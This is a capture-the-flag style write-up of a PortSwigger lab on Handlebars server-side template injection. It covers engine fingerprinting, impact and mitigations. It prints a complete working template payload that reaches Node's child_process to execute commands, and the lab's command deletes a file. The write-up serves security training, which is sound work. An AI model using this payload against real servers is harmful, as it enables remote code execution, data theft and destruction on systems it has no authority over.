# Server-Side Template Injection in an Unknown Language with a documented exploit
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Server-Side Template Injection in an Unknown Language with a documented exploit_

---
## DESCRIPTION
The application accepts user input via the `message` parameter and renders it using a server-side template engine. The engine was identified as **Handlebars** (Node.js environment) based on error messages and syntax fuzzing. The configuration lacks proper sandboxing, allowing access to the `child_process` module to execute system commands.

---
## ROOT CAUSE
**Insecure Template Helper Access:** Handlebars is a logic-less template engine, but it allows helper functions. The application exposes the capability to manipulate objects (like `split` and `constructor`) within the `{{#with}}` block. This allows an attacker to "prototype pollute" or walk up the prototype chain to access the `require` function, which is normally restricted.

---
## ATTACK SCENARIO
1. **Fingerprinting:** The attacker injects fuzz strings like `{{7*7}}`, `${7*7}`, and `<%= 7*7 %>`. The syntax `{{...}}` causes an error message explicitly mentioning "Handlebars", confirming the engine.
2. **Exploit Research:** Searching for "Handlebars SSTI RCE" reveals a known technique (Zombiehelp54 exploit) that abuses the `blockHelperMissing` or `with` helpers to access the global `require`.
3. **Payload Customization:** The attacker modifies the standard exploit to import `child_process` and execute `rm /home/carlos/morale.txt`.
4. **Delivery:** The payload is URL-encoded and passed in the `message` GET parameter.
5. **Execution:** The Node.js server parses the template, executes the injected JavaScript, and deletes the file.

---
## PROOF OF CONCEPT
### Injection Point
- **URL:** `/?message=<PAYLOAD>`
- **Parameter:** `message`
- **Method:** GET
### Payload Used
```Handlebars
wrtz{{{{#with "s" as |string|}}}}
        {{{{#with "e"}}}}
            {{{{#with split as |conslist|}}}}
                {{{{this.pop}}}}
                {{{{this.push (lookup string.sub "constructor")}}}}
                {{{{this.pop}}}}
                {{{{#with string.split as |codelist|}}}}
                    {{{{this.pop}}}}
                    {{{{this.push "return require('child_process').exec('{command}');"}}}}
                    {{{{this.pop}}}}
                    {{{{#each conslist}}}}
                        {{{{#with (string.sub.apply 0 codelist)}}}}
                            {{{{this}}}}
                        {{{{/with}}}}
                    {{{{/each}}}}
                {{{{/with}}}}
            {{{{/with}}}}
        {{{{/with}}}}
    {{{{/with}}}}
```
### Retrieval Point
The attack is "Blind" in terms of output (the command result isn't printed to the screen), but the effect (file deletion) is verifiable by the system state.

---
## IMPACT
**Critical (Remote Code Execution):** The vulnerability allows the execution of arbitrary commands in the underlying Node.js environment. This grants full control over the server, allowing data theft, service disruption, and lateral movement.

---
## FIX / MITIGATION
- **Sanitize Input:** Treat all user input as text, not executable template code.
- **Use a Sandbox:** Run the Handlebars instance in a restricted context (e.g., using `vm2` in Node.js) to prevent access to `require` and `process`.
- **Update Libraries:** Ensure the template engine is patched against known prototype pollution or helper exploits.

---
## KEY LEARNING
- **Error Messages are Gold:** A cryptic 500 error is useless, but a stack trace mentioning `handlebars.js` instantly narrows the search space from "Unknown SSTI" to "Handlebars RCE".
- **Polyglot Fuzzing:** When the language is unknown, use a "Polyglot" payload (a string containing syntax for many engines like `${{<%`) to trigger a specific parser error.

---
